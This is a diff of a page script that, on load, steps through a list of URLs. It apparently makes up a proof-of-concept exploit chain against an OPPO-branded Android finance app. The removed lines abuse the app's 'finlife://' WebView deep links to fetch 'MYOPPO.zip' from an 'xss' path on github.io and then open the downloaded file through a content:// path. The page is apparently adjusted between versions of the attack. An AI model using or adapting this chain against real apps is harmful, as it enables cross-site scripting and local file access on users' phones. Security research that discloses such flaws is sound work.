@@ -11,9 +11,9 @@
   <script>
     document.addEventListener('DOMContentLoaded', () => {
         const urls = [
-            'https://fineasy.topkredittk.com/view/fe_oppo/home',
-            'finlife://finlife/webView/okspin?url=https://syukirman-amir.github.io/xss/MYOPPO.zip',
-            'finlife://finlife/webView/tabWeb?url=content://com.coloros.filemanager/root/storage/emulated/0/Download/MYOPPO.zip',
+            'https://fineasy.topkredittk.com/view/fe_oppo/personal-center"',
+            'https://syukirman-amir.github.io/xss/MYOPPO.zip',
+            'content://com.coloros.filemanager/root/storage/emulated/0/Download/MYOPPO.zip',
             'https://www.youtube.com/watch?v=tf-HYnN0H4Y'
         ];
 
@@ -24,7 +24,7 @@
             if (index < urls.length) {
                 let delay = defaultDelay;
 
-                if (urls[index] === 'finlife://finlife/webView/okspin?url=https://syukirman-amir.github.io/xss/MYOPPO.zip') {
+                if (urls[index] === 'https://syukirman-amir.github.io/xss/MYOPPO.zip') {
                     delay = specialDelay;
                 }
 
